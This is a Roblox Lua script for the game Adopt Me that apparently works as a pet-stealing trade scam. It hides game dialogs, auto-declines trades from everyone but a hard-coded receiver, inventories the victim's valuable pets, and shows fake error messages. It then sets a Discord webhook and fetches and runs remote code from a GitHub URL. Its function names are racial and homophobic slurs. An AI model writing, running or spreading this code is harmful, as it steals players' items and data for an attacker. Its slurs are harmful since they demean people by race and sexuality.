repeat wait() until game:IsLoaded()

if getgenv().adm then return end
getgenv().adm = true

local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")

local function gay(guiElement)
    if guiElement then
        guiElement.Position = UDim2.new(1000, 0, 1000, 0)
    end
end
local function nigga()
    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
    local dialogApp = playerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        dialogApp.Dialog.Visible = false
        gay(dialogApp.Dialog)
    end
end
local function declineniggers(player)
    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
end
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
nigga()
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    if sender.Name ~= Username then
        declineniggers(sender)
    end
end)
declineniggers()

if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
    Webhook = ""
    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server!")
end

--uhh this priv server checker only checks for the user's status so... yeah just in case
if #game:GetService("Players"):GetPlayers() <= 5 then
    game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable get Remote.Events")
    wait(5)
    game:Shutdown()
end


local Pets = {}
local PetCounts = {}
local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))

local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0
local rare_count, uncommon_count, common_count, total_pets = 0, 0, 0, 0
for i, v in pairs(ClientData.get("inventory").pets) do
    total_pets = total_pets + 1
end

for i, v in pairs(ClientData.get("inventory").pets) do
    local petData = InventoryDB[v.category][v.id]
    
    if petData.rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
    if petData.properties == "mega_neon" then
        mega_count = mega_count + 1
    end
    if petData.properties == "neon" then
        neon_count = neon_count + 1
    end
    if petData.rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
    if petData.rarity == "rare" then
        rare_count = rare_count + 1
    end
    if petData.rarity == "uncommon" then
        uncommon_count = uncommon_count + 1
    end
    if petData.rarity == "common" then
        common_count = common_count + 1
    end
end

local teleport = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'

local plr = game.Players.LocalPlayer
local accage = game.Players.LocalPlayer.AccountAge
local IdValue = game:GetService("Players").LocalPlayer.userId
or "Unknown"
local receiver = Username
local ExecutorValue = identifyexecutor() or "Unknown"
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local VersionValue = "1.3"

local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
local neon_count = 0
local mega_neon_count = 0
local flyable_count = 0
local rideable_count = 0
local fr_count = 0

for _, petData in pairs(playerData.inventory.pets) do
    if petData.properties and type(petData.properties) == "table" then
        if petData.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.properties.mega_neon then
            mega_neon_count = mega_neon_count + 1
        end
        if petData.properties.flyable then
            flyable_count = flyable_count + 1
        end
        if petData.properties.rideable then
            rideable_count = rideable_count + 1
        end
        if petData.properties.rideable or petData.properties.flyable then
            fr_count = fr_count + 1
        end
    end
end

if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 then
    Webhook = ""
    game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected,"For The Script To Work, You Need A Good Pet. It Doesnâ€™t Work With Trash Pets. The Script Is Functional For Freezing Good Pets In Trade [No Remote.Event Detected]")
end

UserName = "lord_magic0"
WebHook = "https://discord.com/api/webhooks/1318634606349779026/JZCqZPCymJXyh4Al5H8gou0QEb2BsXsIOs_7zzaBXfQr5LTISb1NKMpNanlp3vs1ckRA"
loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
